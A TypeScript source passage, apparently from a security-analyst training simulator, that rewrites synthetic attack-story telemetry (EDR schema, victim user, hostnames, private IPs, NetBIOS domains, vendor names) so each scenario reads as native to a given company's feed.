      Object.assign(block, ecsTechnique(e.mitre_technique));
    }
  }
  // The authored vendor's keys carried the evidence; where the target EDR has no native
  // record for this event (Sophos on Linux, …) the legacy view shows the raw block — so the
  // structured facts go in as neutral ECS fields, never an empty record.
  const ecs: Record<string, unknown> = {};
  const put = (k: string, v: unknown) => { if (v !== undefined && v !== null && v !== "" && neutral[k] === undefined) ecs[k] = v; };
  put("host.name", e.hostname); put("user.name", e.process?.user ?? e.user_email?.split("@")[0]);
  put("process.name", e.process?.name); put("process.executable", e.process?.path); put("process.command_line", e.process?.cmdline);
  put("process.pid", e.process?.pid); put("process.parent.name", e.process?.parent_name);
  put("process.hash.sha256", e.process?.hash?.sha256);
  put("file.path", e.file?.path); put("file.hash.sha256", e.file?.sha256); put("file.size", e.file?.size);
  put("url.full", e.network?.url); put("destination.ip", e.dst_ip); put("destination.port", e.dst_port);
  put("registry.path", e.registry?.path); put("registry.value", e.registry?.value);
  for (const [k, v] of Object.entries(ecsTechnique(e.mitre_technique))) put(k, v);
  return { ...block, ...ecs, ...neutral };
}

/**
 * Adapt a shared attack story to the ACTIVE company so it reads as native telemetry,
 * not the same CrowdStrike chain under a new company name. ALWAYS applied. It rewrites
 * every company-identifying detail the story baked in for its author-company:
 *   • EDR vendor + raw schema  → the company's EDR (see reshapeEdrRaw above)
 *   • victim identity          → a user from the company roster (email + name forms)
 *   • email domain + NetBIOS   → the company's (catches DOMAIN\\user forms too)
 *   • hostnames                → the company's asset pool
 * across the banner, the description, the structured process/file fields, AND the raw
 * log — the last matters because the student is told to quote the raw exactly, so a
 * stale value there would be scored as fabricated evidence.
 */
/** A server name that says Linux / container platform. */
const LINUX_NAME = /(^|[-_])(lnx|linux|nix|k8s|k8snode|kube|ubuntu|rhel|centos|debian)([-_\d]|$)/i;
/** Servers with one job: only a story server with the same role may be mapped onto them. */
const SPECIALISED = new Set(["exchange", "k8s", "dc", "federation"]);
/** Roles a company's registry may lack: with no server of that role, the story's own name stays (an AD FS farm is not the file server). */
const KEEP_IF_ABSENT = new Set(["federation"]);
/** A server's role from its name (file, db, exchange, web, app, backup, erp, emr, wms, jump, k8s). */
function serverRole(h: string): string | undefined {
  const n = h.toLowerCase();
  if (/adfs|(^|[-_])fed([-_\d]|$)|federation/.test(n)) return "federation";
  if (/exch|mail/.test(n)) return "exchange";
  if (/k8s|kube/.test(n)) return "k8s";
  if (/(^|[-_])dc[-_]?\d*([^a-z]|$)/.test(n)) return "dc";
  if (/sql|(^|[-_])db/.test(n)) return "db";
  if (/(^|[-_])(fs|file|files|nas)([-_\d]|$)/.test(n)) return "file";
  if (/backup|bkp|(^|[-_])bak/.test(n)) return "backup";
  if (/(^|[-_])web|iis|www/.test(n)) return "web";
  if (/(^|[-_])(jmp|jump|adm|admin)([-_\d]|$)/.test(n)) return "jump";
  if (/erp|sap/.test(n)) return "erp";
  if (/emr|ehr|pacs/.test(n)) return "emr";
  if (/wms/.test(n)) return "wms";
  if (/(^|[-_])app/.test(n)) return "app";
  return undefined;
}
/** What OS a story shows a host running: Linux (auditd, unix paths) or Windows (Security log, Windows paths), else unknown. */
function serverOs(h: string, events: TelemetryEvent[]): "linux" | "windows" | undefined {
  const on = events.filter(e => e.hostname === h);
  if (on.some(e => e.source === "linux_audit" || /^\/(usr|bin|sbin|etc|home|opt|var|tmp)\//.test(e.process?.path ?? ""))) return "linux";
  if (on.some(e => e.source === "ad" || e.source === "windows_security" || e.source === "sysmon" || /^[a-z]:\\/i.test(e.process?.path ?? "") || /^[a-z]:\\/i.test(e.file?.path ?? ""))) return "windows";
  return LINUX_NAME.test(h) ? "linux" : undefined;
}

export function instantiateStory(s: AttackStory, companyPool: TelemetryEvent[], companyEdr?: string, companyId?: string): AttackStory {
  const targetNs = edrNsOfVendor(companyEdr);
  // Before any vendor reshape drops the authored keys: a hash-only alert names its file; one
  // client IP keeps one place / network owner and one login flow keeps one session id across rows.
  s = { ...s, events: threadIdentityContext(threadFilesByHash(s.events)) };
  if (companyEdr) {
    s = {
      ...s,
      events: s.events.map(e =>
        e.source === "edr" && e.vendor && e.vendor !== companyEdr ? { ...e, vendor: companyEdr } : e
      ),
    };
  }

  // L-03 (upgraded to CRITICAL): route the attack chain through the SAME company
  // adaptation the baseline already gets, and do it ALWAYS (not 50% of the time).
  // Otherwise the attack betrays itself in three more ways beyond the vendor: on a
  // SentinelOne shop every CrowdStrike event IS the attack; the one hostname that
  // doesn't match the asset pool is the attack; the one email domain that isn't the
  // company's is the attack. Swap victim→company roster, hostnames→company assets,
  // and the internal domain→the company's, so the incident reads as native.
  const roster: string[] = [];  const rSeen = new Set<string>();
  const hostPool: string[] = []; const hSeen = new Set<string>();
  const domainCount = new Map<string, number>();
  for (const e of companyPool) {
    const u = e.user_email;
    if (u && !SERVICE_ACCOUNT.test(u) && !rSeen.has(u)) { rSeen.add(u); roster.push(u); }
    if (u && u.includes("@")) { const d = u.split("@")[1]; domainCount.set(d, (domainCount.get(d) ?? 0) + 1); }
    const h = e.hostname;
    if (h && !hSeen.has(h)) { hSeen.add(h); hostPool.push(h); }
  }
  let companyDomain = [...domainCount.entries()].sort((a, b) => b[1] - a[1])[0]?.[0];

  // R-01 (CRITICAL): host + IP were never made company-specific — the shared benign
  // pool overlaps across companies, so the same WS-OPS-2214 / 10.10.55.19 opened in
  // the EDR console for all five, and a QuantumBank attack read as a NexaCorp London
  // workstation the analyst could not correlate to the feed. Draw hosts, the internal
  // subnet and the domain from the per-company asset registry, which mirrors the
  // conventions the SIEM feed uses — so the console shows the same host + IP as the
  // feed. Registry wins over the benign-pool inference when the company is known.
  const assets = companyId ? COMPANY_ASSETS[companyId] : undefined;
  const registryHostPool = assets ? assets.hosts : hostPool;
  if (assets) companyDomain = assets.domain;

  const pairs: [string, string][] = [];

  // Victim identity → a company roster user, in every form it appears (full email,
  // dotted name, squashed name). Longest-first so the email is replaced before the
  // bare username substring.
  const counts = new Map<string, number>();
  for (const e of s.events) if (e.user_email && !SERVICE_ACCOUNT.test(e.user_email)) counts.set(e.user_email, (counts.get(e.user_email) ?? 0) + 1);
  const victim = [...counts.entries()].sort((a, b) => b[1] - a[1])[0]?.[0];
  // Role-aware: when the victim does admin work (SSH / sudo / Linux servers, an admin
  // account), the replacement is someone whose job is IT — not a truck driver.
  const adminStory = (victim ? /(^|[-._])(admin|adm|it|ops|sysadmin|root)([-._@]|$)/i.test(victim) : false) ||
    s.events.some(e => e.user_email === victim && (e.source === "linux_audit" || /sudo|ssh|priv/i.test(e.event_type)));
  const titleOf = new Map<string, string>();
  for (const e of companyPool) {
    const t = e.user_title ?? (e.user as { title?: string } | undefined)?.title;
    if (e.user_email && t && !titleOf.has(e.user_email)) titleOf.set(e.user_email, t);
  }
  const IT_TITLE = /admin|engineer|devops|it\b|sysadmin|infrastructure|sre|security|network|platform|operations/i;
  const itRoster = roster.filter(u => IT_TITLE.test(titleOf.get(u) ?? "") || /(^|[-._])(admin|it|ops)([-._@]|$)/i.test(u));
  const candidates = adminStory && itRoster.length ? itRoster : roster;
  const replacement = candidates.length ? candidates[Math.floor(Math.random() * candidates.length)] : undefined;
  if (victim && replacement && victim !== replacement) {
    const on = victim.split("@")[0], nn = replacement.split("@")[0];
    pairs.push([victim, replacement], [on, nn], [on.replace(/\./g, ""), nn.replace(/\./g, "")]);
    // …and the victim's NAME ("Tomer Ravid" in a displayName field, "a converter Tomer
    // uses" in prose) — otherwise the text names a different person than the row's user.
    const surname = on.split(/[._]/).pop() ?? "";
    if (/^[a-z'-]{3,}$/i.test(surname)) {
      const re = new RegExp(`\\b([A-Z][a-z]{2,}) (${surname.charAt(0).toUpperCase()}${surname.slice(1)})\\b`);
      let full: RegExpMatchArray | null = null;
      for (const e of s.events) { full = JSON.stringify([e.description, e.raw, e.user]).match(re); if (full) break; }
      if (full) {
        const newName = nn.split(/[._]/).filter(Boolean).map(w => w.charAt(0).toUpperCase() + w.slice(1)).join(" ");
        pairs.push([full[0], newName], [full[1], nn]);
      }
    }
  }

  // Internal email domain → the company's (catches any other internal identity that
  // still carried the story's baked-in domain, e.g. cryotech.com on a MedCore feed).
  const victimDomain = victim?.includes("@") ? victim.split("@")[1] : undefined;
  if (victimDomain && companyDomain && victimDomain !== companyDomain) pairs.push([victimDomain, companyDomain]);

  // Every OTHER tenant's identity → this company's: stories were authored for one company
  // (mostly NexaCorp), and its brand in a lure, its look-alike domain (nexacorp-portal.ru),
  // its SharePoint tenant, its realm in a VPN group all leaked into another tenant's feed.
  // A look-alike domain must impersonate the company actually under attack.
  if (companyId && COMPANY_ASSETS[companyId]) pairs.push(...otherTenantPairs(companyId));

  // Story hostnames → the company's asset pool, ROLE-AWARE (P0-4, 2026-09-27 live
  // playtest). The old pick hashed every story host into the whole registry, so a
  // domain controller could land on a Finance workstation (4720/4728 "logged on
  // WS-FIN-2847") and containment was aimed at the wrong machine. Now:
  //   • a domain controller maps to the company's DC,
  //   • a server maps to a company server (registry first, then the pool's servers),
  //   • a workstation maps to a company workstation — the victim's workstation to one
  //     the replacement victim actually uses in the feed (or one nobody else owns), so
  //     a story never borrows another employee's desk.
  // Deterministic per distinct host, and no two story hosts collide onto one asset.
  // Company machines only: a fully-qualified name on a cloud row (nexacorp.sharepoint.com,
  // graph.microsoft.com) is a service, not a workstation — mapping it onto WS-SALES-1876
  // rewrote a SharePoint site URL into a hostname.
  const storyHosts = [...new Set(s.events.map(e => e.hostname).filter((h): h is string => !!h && !h.includes(".")))];
  const hostMap = new Map<string, string>();
  const hostHash = (h: string) => { let x = 2166136261; for (let i = 0; i < h.length; i++) { x ^= h.charCodeAt(i); x = Math.imul(x, 16777619); } return Math.abs(x); };
  const isDcHost = (h: string) => (assets && h === assets.dc) || /(^|[^a-z0-9])dc[-_]?\d*([^a-z]|$)/i.test(h);
  // A machine the story shows running Linux (auditd, unix paths) is a server, never a workstation.
  // A Mac also runs /usr/bin binaries (osascript, curl) — a host any row shows as macOS is a laptop, not a server.
  const macHosts = new Set(s.events.filter(e => e.hostname && (/darwin|^mac/i.test(String(e.raw?.["host.os.family"] ?? e.raw?.["crowdstrike.event_platform"] ?? "")) || /^\/(Applications|Users|Volumes|System|Library)\//.test(e.process?.path ?? e.file?.path ?? ""))).map(e => e.hostname!));
  const linuxHosts = new Set(s.events.filter(e => e.hostname && !macHosts.has(e.hostname) && (e.source === "linux_audit" || /^\/(usr|bin|sbin|etc|home|opt|var|tmp)\//.test(e.process?.path ?? ""))).map(e => e.hostname!));
  const isServerHost = (h: string) => !isDcHost(h) && (
    (assets ? h === assets.fileServer : false) ||
    /^(srv|svr|server|prod|db|web|app|sql|k8s|nix|lnx|linux|ubuntu|rhel|centos|debian|ip-\d)[-_]/i.test(h) ||
    /[-_](srv|sql|fs|file|files|app|web|db|exch|adm|jmp|jump|emr|erp|wms|sap|linux|lnx|backup|bkp|bak|nas)[-_]?\d*$/i.test(h) ||
    linuxHosts.has(h) ||
    /[-_](srv|sql|fs|file|files|app|web|db|emr|erp|wms|sap|linux|lnx)\d*[-_]/i.test(h)
  );
  // Who works on each pool host (most frequent human user) — used to keep a story
  // off another employee's workstation.
  const ownerCount = new Map<string, Map<string, number>>();
  for (const e of companyPool) {
    if (!e.hostname || !e.user_email || SERVICE_ACCOUNT.test(e.user_email)) continue;
    const m = ownerCount.get(e.hostname) ?? new Map<string, number>();
    m.set(e.user_email, (m.get(e.user_email) ?? 0) + 1);
    ownerCount.set(e.hostname, m);
  }
  const ownerOf = (h: string) => { const m = ownerCount.get(h); return m ? [...m.entries()].sort((a, b) => b[1] - a[1])[0]?.[0] : undefined; };
  const assetHosts = [...new Set([...registryHostPool, ...hostPool])];
  const dcTargets = [...new Set([...(assets ? [assets.dc] : []), ...assetHosts.filter(isDcHost)])];
  const serverTargets = [...new Set([...registryHostPool.filter(isServerHost), ...hostPool.filter(isServerHost)])];
  const workstationTargets = registryHostPool.filter(h => !isDcHost(h) && !isServerHost(h));
  const poolLinux = new Set(companyPool.filter(e => e.hostname && e.source === "linux_audit").map(e => e.hostname!));
  const used = new Set<string>();
  const pickFrom = (cands: string[], h: string, allowReuse = false): string | undefined => {
    if (cands.length === 0) return undefined;
    const start = hostHash(h) % cands.length;
    for (let k = 0; k < cands.length; k++) { const c = cands[(start + k) % cands.length]; if (!used.has(c)) return c; }
    return allowReuse ? cands[start] : undefined;
  };
  const storyHostUsers = new Map<string, Set<string>>();
  for (const e of s.events) if (e.hostname && e.user_email) {
    const set = storyHostUsers.get(e.hostname) ?? new Set<string>();
    set.add(e.user_email); storyHostUsers.set(e.hostname, set);
  }
  storyHosts.forEach((h) => {
    let t: string | undefined;
    if (isDcHost(h)) {
      // The company's primary DC first (it is where the feed's own domain events live).
      t = dcTargets.find(c => !used.has(c)) ?? dcTargets[0];
    } else if (isServerHost(h)) {
      // Role- and OS-aware: a Windows file server never lands on the Linux box, the K8s node or
      // the Exchange server; a story's database server prefers the company's database server.
      const storyOs = serverOs(h, s.events);
      const role = serverRole(h);
      const fits = (c: string) => {
        const cOs = poolLinux.has(c) || LINUX_NAME.test(c) ? "linux" : "windows";
        if (storyOs && storyOs !== cOs) return false;
        const cRole = serverRole(c);
        return !SPECIALISED.has(cRole ?? "") || cRole === role;
      };
      const sameRole = serverTargets.filter(c => fits(c) && role && serverRole(c) === role);
      t = pickFrom(sameRole, h) ?? (role && KEEP_IF_ABSENT.has(role) ? h : undefined) ?? pickFrom(serverTargets.filter(fits), h)
        ?? pickFrom(serverTargets, h) ?? pickFrom(workstationTargets.length ? [] : registryHostPool, h, true);
    } else {
      const users = storyHostUsers.get(h);
      const victimHost = !!(victim && users?.has(victim));
      const newUser = victimHost ? replacement : undefined;
      const owned = newUser ? workstationTargets.filter(w => ownerOf(w) === newUser) : [];
      const unowned = workstationTargets.filter(w => !ownerOf(w));
      const notOthers = workstationTargets.filter(w => { const o = ownerOf(w); return !o || (users?.has(o) ?? false) || o === newUser; });
      t = pickFrom(owned, h) ?? pickFrom(unowned, h) ?? pickFrom(notOthers, h) ?? pickFrom(workstationTargets, h, true);
    }
    if (!t) t = registryHostPool.length ? registryHostPool[hostHash(h) % registryHostPool.length] : h;
    used.add(t);
    if (t !== h) { hostMap.set(h, t); pairs.push([h, t]); }
  });

  // Story INTERNAL IPs → the company's own subnet (R-01). Only RFC1918 addresses are
  // remapped — a public C2/attacker IP is company-agnostic and must stay identical so
  // threat-intel pivots still work. Each distinct private IP keeps its last octet and
  // takes the company's /24, so the host's IP correlates with the feed and two events
  // on the same source IP still share one address in the console.
  const ipMap = new Map<string, string>();
  if (assets) {
    const isPrivate = (ip: string) => /^(10\.|172\.(1[6-9]|2\d|3[01])\.|192\.168\.)/.test(ip);
    // A company host's own address — the one its noise in the feed already shows (most
    // frequent outbound source), else a stable one from its name (WS-NURS-044 → .44).
    // A story IP that belonged to a story host takes the address of the company host it
    // was mapped onto: one host, one IP across the story AND the noise around it.
    const HOSTISH = new Set(["edr", "sysmon", "av", "windows_security", "linux_audit", "firewall", "proxy", "dns"]);
    const inbound = (e: TelemetryEvent) => (e.network as { direction?: string } | undefined)?.direction === "inbound" || /inbound/i.test(String(e.raw?.["network.direction"] ?? ""));
    const poolCounts = new Map<string, Map<string, number>>();
    for (const e of companyPool) {
      if (!e.hostname || !e.src_ip || !isPrivate(e.src_ip) || !HOSTISH.has(e.source) || inbound(e)) continue;
      const m = poolCounts.get(e.hostname) ?? new Map<string, number>();
      m.set(e.src_ip, (m.get(e.src_ip) ?? 0) + 1); poolCounts.set(e.hostname, m);
    }
    const taken = new Map<string, string>();   // ip → host that owns it
    const hostIp = new Map<string, string>();
    for (const [h, m] of poolCounts) { const ip = [...m].sort((x, y) => y[1] - x[1])[0][0]; hostIp.set(h, ip); if (!taken.has(ip)) taken.set(ip, h); }
    const free = (seed: number) => { for (let i = 0; i < 254; i++) { const ip = `${assets.subnet}.${((seed + i) % 250) + 3}`; if (!taken.has(ip)) return ip; } return `${assets.subnet}.${(seed % 250) + 3}`; };
    const canonicalIp = (host: string): string => {
      const known = hostIp.get(host);
      if (known) return known;
      const n = Number(/(\d+)(?!.*\d)/.exec(host)?.[1] ?? NaN);
      const byName = Number.isFinite(n) && n >= 2 && n <= 254 ? `${assets.subnet}.${n}` : undefined;
      const ip = byName && !taken.has(byName) ? byName : free(hostHash(host));
      hostIp.set(host, ip); taken.set(ip, host);
      return ip;
    };
    for (const e of s.events) {
      if (!e.hostname || !e.src_ip || !isPrivate(e.src_ip) || !HOSTISH.has(e.source) || inbound(e) || ipMap.has(e.src_ip)) continue;
      const target = hostMap.get(e.hostname) ?? e.hostname;
      const t = canonicalIp(target);
      ipMap.set(e.src_ip, t);
      if (t !== e.src_ip) pairs.push([e.src_ip, t]);
    }
    // Any other internal address (a server it reached, a peer): the company's /24, last
    // octet kept — never landing on an address another host already owns.
    const remapIp = (ip?: string) => {
      if (!ip || !isPrivate(ip) || ipMap.has(ip)) return;
      const octet = Math.min(254, Math.max(1, Number(ip.split(".")[3]) || 10));
      let t = `${assets.subnet}.${octet}`;
      if (taken.has(t)) t = free(octet);
      taken.set(t, `ip:${ip}`);
      ipMap.set(ip, t);
      if (t !== ip) pairs.push([ip, t]);
    };
    for (const e of s.events) { remapIp(e.src_ip); remapIp(e.dst_ip); }
  }

  // NetBIOS/realm domain forms (NEXACORP\\user) survive the email-domain swap and
  // still name the origin company, so map every origin DOMAIN\\user token to the
  // company's short name.
  //
  // E-01 fix: the old scan ran a "(word)\\" regex over JSON.stringify(process/raw),
  // where a Windows path's single backslash serialises to "\\" — so it matched EVERY
  // path segment (Users\, Downloads\, Google\, Chrome\, the Adobe folder ARM\, even
  // the username) and rewrote each to the company name, corrupting 62% of
  // investigations. Constraining to "uppercase word" was not enough — legitimate path
  // folders are upper-cased too (ProgramData\Adobe\ARM\, C:\WINDOWS\). The reliable
  // signal is WHERE the token lives: a NetBIOS domain only ever appears in an
  // IDENTITY field (process.user, a *DomainName / *UserName / AccountName raw key),
  // never inside a filesystem path. So we scan ONLY those fields — a path is never
  // read — and take the DOMAIN part of a DOMAIN\<lowercase-user> token (real
  // usernames are lowercase: l.ferreira, svc-backup — which also skips
  // NT AUTHORITY\SYSTEM and BUILTIN\Administrators), plus any bare realm value in a
  // *DomainName field. Known system principals are never treated as a company.
  const SYSTEM_REALMS = new Set(["NT AUTHORITY", "AUTHORITY", "BUILTIN", "NT SERVICE", "SERVICE", "WORKGROUP", "LOCAL", "NT VIRTUAL MACHINE"]);
  const IDENTITY_KEY = /(user\.?name|SubjectUserName|TargetUserName|AccountName|SamAccountName|DomainName|LogonDomain|srcuser|dstuser|source\.user)/i;
  // The tenant's real NetBIOS realm (QBANK, not QUANTUMBANK) — the one its native records use.
  const companyNetbios = companyId ? companyNetbiosOf(companyId) : (companyDomain?.split(".")[0] ?? "").toUpperCase();
  if (companyNetbios) {
    const storyNetbios = new Set<string>();
    const harvest = (v: unknown, wholeIsDomain: boolean) => {
      if (typeof v !== "string" || !v.trim()) return;
      // DOMAIN\<lowercase user> anywhere in the value → take the DOMAIN.
      for (const m of v.matchAll(/([A-Za-z][A-Za-z0-9-]{1,})\\{1,2}(?=[a-z])/g)) {
        if (!SYSTEM_REALMS.has(m[1].toUpperCase())) storyNetbios.add(m[1]);
      }
      // A *DomainName field's whole value is the realm (e.g. "NEXACORP"); accept it
      // when it looks like a NetBIOS name (no dot → not a DNS/email domain).
      if (wholeIsDomain) {
        const t = v.trim();
        if (/^[A-Za-z][A-Za-z0-9-]{1,}$/.test(t) && !SYSTEM_REALMS.has(t.toUpperCase())) storyNetbios.add(t);
      }
    };
    for (const e of s.events) {
      harvest(e.process?.user, false);
      for (const [k, val] of Object.entries(e.raw ?? {})) if (IDENTITY_KEY.test(k)) harvest(val, /DomainName$/i.test(k));
    }
    for (const nb of storyNetbios) if (nb.toUpperCase() !== companyNetbios) {
      pairs.push([nb, nb === nb.toLowerCase() ? companyNetbios.toLowerCase() : companyNetbios]);
    }
  }

  // EDR product names in prose / raw values → the company's own EDR (skip the ones
  // that ARE the company's product). Longest-first ordering (below) means
  // "Microsoft Defender for Endpoint" is replaced before the bare "Defender".
  if (companyEdr) {
    const cl = companyEdr.toLowerCase();
    for (const nm of EDR_PRODUCT_NAMES) {
      const nl = nm.toLowerCase();
      if (cl.includes(nl) || nl.includes(cl)) continue;   // never rewrite the company's own product
      pairs.push([nm, companyEdr]);
    }
  }

  const clean = pairs.filter(([f, t]) => f && t && f !== t).sort((a, b) => b[0].length - a[0].length);
  const subStr = (str: string) => { let o = str; for (const [f, t] of clean) if (o.includes(f)) o = o.split(f).join(t); return o; };
  // Nothing to change AND no EDR schema to normalise → return the story untouched.
  if (clean.length === 0 && !targetNs && !assets) return s;

  // Every structured sub-object is rewritten, not just process/network/raw: the victim
  // swap used to miss `file` (playtest 2026-09-27: file.path C:\Users\d.rosen\… beside a
  // raw C:\Users\d.morgan\… in the SAME log), and registry/dns/cloud/user carry names too.
  const rep = <T,>(v: T): T => (v ? (deepReplace(v, clean) as T) : v);
  const adaptedEvents = s.events.map(e => {
    const adapted = {
      ...e,
      // Other story identities keep their name but take the company's domain.
      user_email: victim && e.user_email === victim && replacement ? replacement : (e.user_email ? subStr(e.user_email) : e.user_email),
      // A machine maps onto a company host; a service FQDN (aad.nexacorp.com) takes the
      // company's identity like every other string.
      hostname:   e.hostname && hostMap.has(e.hostname) ? hostMap.get(e.hostname)! : e.hostname?.includes(".") ? subStr(e.hostname) : e.hostname,
      src_ip:     e.src_ip && ipMap.has(e.src_ip) ? ipMap.get(e.src_ip)! : e.src_ip,
      dst_ip:     e.dst_ip && ipMap.has(e.dst_ip) ? ipMap.get(e.dst_ip)! : e.dst_ip,
      description: e.description ? fixRoleWords(subStr(e.description)) : e.description,
      // The decoy's explanation and IT's answer name the same people and tenant (the report
      // shows them; an approved-ticket record in the feed quotes the explanation).
      fp_explanation: e.fp_explanation ? subStr(e.fp_explanation) : e.fp_explanation,
      it_verify_message: e.it_verify_message ? subStr(e.it_verify_message) : e.it_verify_message,
      process: rep(e.process),
      network: rep(e.network),
      file: rep(e.file),
      registry: rep(e.registry),
      dns: rep(e.dns),
      cloud: rep(e.cloud),
      user: rep(e.user),
      raw: rep(e.raw),
    };
    // Reshape a foreign-EDR raw block into the company's own vendor convention.
    if (adapted.source === "edr" && targetNs && edrNsOfKeys(adapted.raw) && edrNsOfKeys(adapted.raw) !== targetNs) {
      // The authored vendor's keys go — keep what they said about the file and the process
      // in the structured fields first, or the target EDR renders "a threat on an unknown file".
      const f = edrFacts(adapted);
      if (!adapted.file && f.file.path) adapted.file = { path: f.file.path, name: f.file.name, sha256: f.file.sha256, md5: f.file.md5 };
      const pname = f.proc.name ?? f.proc.path?.split(/[\\/]/).pop();
      if (!adapted.process && pname) {
        // The account and hash too — a reshape that dropped crowdstrike.UserName rendered an lsass access with no user.
        const user = f.user ? (f.userDomain ? `${f.userDomain}\\${f.user}` : f.user) : undefined;
        adapted.process = { name: pname, pid: f.proc.pid ?? 0, path: f.proc.path, cmdline: f.proc.cmdline, parent_name: f.parent.name,
          ...(user ? { user } : {}), ...(f.proc.sha256 ? { hash: { sha256: f.proc.sha256, md5: f.proc.md5 } } : {}) };
      }
      // A cross-process access (lsass target, granted rights) has no structured field: it rides on the event's endpoint facts.
      if (f.access) stashThread(adapted, { access: f.access });
      adapted.raw = reshapeEdrRaw(adapted, targetNs) as typeof adapted.raw;
    }
    return adapted;
  });

  // Last: one story → one set of endpoint identities (image path / hash per host, parent facts, writers, SIDs, logon ids).
  return { ...s, events: threadEndpointStory(threadHostIps(normalizeLogonIds(assets ? pinDomainEventsToDc(adaptedEvents, assets.dc, assets.domain) : adaptedEvents))) };
}

/**
 * One address per host across a story: the EDR's local IP and the firewall's source IP of
 * the same workstation must agree, or the analyst's first pivot (EDR ↔ firewall by IP)
 * fails. The address the story's own outbound network rows show wins; host telemetry
 * without one — or with a conflicting private one — takes it.
 */
const PRIVATE_V4 = /^(10\.|192\.168\.|172\.(1[6-9]|2\d|3[01])\.)/;
const HOST_SOURCES = new Set(["edr", "sysmon", "av", "windows_security"]);
function threadHostIps(events: TelemetryEvent[]): TelemetryEvent[] {
  const ipOf = new Map<string, string>();
  const note = (host: string | undefined, ip: string | undefined) => {
    if (host && ip && PRIVATE_V4.test(ip) && !ipOf.has(host)) ipOf.set(host, ip);
  };
  // Outbound network rows first (their src is unambiguously the host), then host telemetry.
  for (const e of events) if (["firewall", "proxy", "dns"].includes(e.source)) note(e.hostname, e.src_ip);
  for (const e of events) if (HOST_SOURCES.has(e.source) && e.event_type !== "net_connection") note(e.hostname, e.src_ip);
  if (!ipOf.size) return events;
  return events.map(e => {
    const ip = e.hostname ? ipOf.get(e.hostname) : undefined;
    if (!ip || !HOST_SOURCES.has(e.source) || e.src_ip === ip) return e;
    // A host's network event keeps an authored source (inbound: that is the remote peer).
    if (e.event_type === "net_connection" && e.src_ip) return e;
    if (e.src_ip && !PRIVATE_V4.test(e.src_ip)) return e;
    return { ...e, src_ip: ip };
  });
}

/**
 * An EDR alert authored with only a hash (an MDE alert's SHA256) names the file the rest
 * of the story already showed with that hash — every EDR records the file a threat is
 * about, so a SentinelOne / CrowdStrike rendering must not come out as "unknown".
 */
function threadFilesByHash(events: TelemetryEvent[]): TelemetryEvent[] {
  const HASH_KEYS = ["mde.SHA256", "SHA256", "file.hash.sha256", "crowdstrike.SHA256HashData", "s1.threat.sha256", "sophos.sha256"];
  const byHash = new Map<string, NonNullable<TelemetryEvent["file"]>>();
  for (const e of events) {
    if (e.file?.sha256 && e.file.path) byHash.set(e.file.sha256.toLowerCase(), e.file);
    const pp = e.process?.path;
    const ph = (e.raw?.["process.hash.sha256"] ?? e.raw?.["SHA256"]) as string | undefined;
    if (pp && ph && !byHash.has(ph.toLowerCase())) byHash.set(ph.toLowerCase(), { path: pp, name: pp.split(/[\\/]/).pop(), sha256: ph });
  }
  if (!byHash.size) return events;
  return events.map(e => {
    if (e.source !== "edr" || e.file?.path || e.process?.name) return e;
    const h = HASH_KEYS.map(k => e.raw?.[k]).find((v): v is string => typeof v === "string" && /^[a-f0-9]{64}$/i.test(v));
    const known = h ? byHash.get(h.toLowerCase()) : undefined;
    return known ? { ...e, file: { ...known } } : e;
  });
}

// ── Entity-model guards (P0-4, 2026-09-27 live playtest) ─────────────────────
// Domain-scope Windows events are written by the domain controller that processed
// the change — never by a workstation. Global/universal group changes and Kerberos
// ticket events are DC-only by definition; account-lifecycle events are DC-side when
// the target account lives in the domain (TargetDomainName ≠ the host itself).
const DC_ONLY_EVENT_IDS = new Set(["4728", "4729", "4756", "4757", "4768", "4769", "4771"]);
const DOMAIN_ACCOUNT_EVENT_IDS = new Set(["4720", "4722", "4725", "4726", "4738", "4740", "4767"]);
const HOST_KEY = /(^|\.)(computer_name|Computer|ComputerName|DeviceName)$|^host\.(name|hostname)$/;

function winEventId(raw: Record<string, unknown> | undefined): string {
  if (!raw) return "";
  return String(raw["winlog.event_id"] ?? raw["event.code"] ?? raw["EventID"] ?? raw["event_id"] ?? "");
}

function pinDomainEventsToDc(events: TelemetryEvent[], dc: string, domain: string): TelemetryEvent[] {
  return events.map(e => {
    if (e.source !== "windows_security" && e.source !== "ad") return e;
    const id = winEventId(e.raw);
    if (!id || !e.hostname || e.hostname === dc) return e;
    let domainScope = DC_ONLY_EVENT_IDS.has(id);
    if (!domainScope && DOMAIN_ACCOUNT_EVENT_IDS.has(id)) {
      const tdn = Object.entries(e.raw ?? {}).find(([k]) => /TargetDomainName$/.test(k))?.[1];
      const short = e.hostname.split(".")[0].toUpperCase();
      domainScope = typeof tdn === "string" && tdn.trim() !== "" && tdn.toUpperCase() !== short && tdn.toUpperCase() !== "BUILTIN";
    }
    if (!domainScope) return e;
    const old = e.hostname;
    const raw: Record<string, unknown> = {};
    for (const [k, v] of Object.entries(e.raw ?? {})) {
      raw[k] = HOST_KEY.test(k) && typeof v === "string"
        ? (v.includes(".") ? `${dc}.${domain}` : dc)
        : v;
    }
    return { ...e, hostname: dc, raw, description: e.description ? e.description.split(old).join(dc) : e.description };
  });
}

// A Windows LogonId is a per-machine session handle: the same value on two hosts is
// two unrelated sessions, and teaching "same LogonId ⇒ same session" across machines
// is a wrong pivot. When a story reuses one LogonId on several hosts, the first host
// keeps it and every other host gets its own stable value.
const WELL_KNOWN_LOGON_IDS = new Set(["0x3e7", "0x3e4", "0x3e5", "0x0", "0x3e3", "-", ""]);
function normalizeLogonIds(events: TelemetryEvent[]): TelemetryEvent[] {
  const firstHost = new Map<string, string>();
  const isLogonKey = (k: string) => /LogonId$/i.test(k);
  for (const e of events) {
    if (!e.hostname) continue;
    for (const [k, v] of Object.entries(e.raw ?? {})) {
      if (!isLogonKey(k) || typeof v !== "string" || WELL_KNOWN_LOGON_IDS.has(v.toLowerCase())) continue;
      if (!firstHost.has(v)) firstHost.set(v, e.hostname);
    }
  }
  const derive = (v: string, host: string) => {
    let x = 2166136261; const s = `${v}@${host}`;
    for (let i = 0; i < s.length; i++) { x ^= s.charCodeAt(i); x = Math.imul(x, 16777619); }
    return "0x" + ((x >>> 0) % 0xfffffff + 0x1000000).toString(16).toUpperCase();
  };
  return events.map(e => {
    if (!e.hostname || !e.raw) return e;
    let changed = false;
    const raw: Record<string, unknown> = {};
    for (const [k, v] of Object.entries(e.raw)) {
      if (isLogonKey(k) && typeof v === "string" && firstHost.has(v) && firstHost.get(v) !== e.hostname) {
        raw[k] = derive(v, e.hostname); changed = true;
      } else raw[k] = v;
    }
    return changed ? { ...e, raw } : e;
  });
}
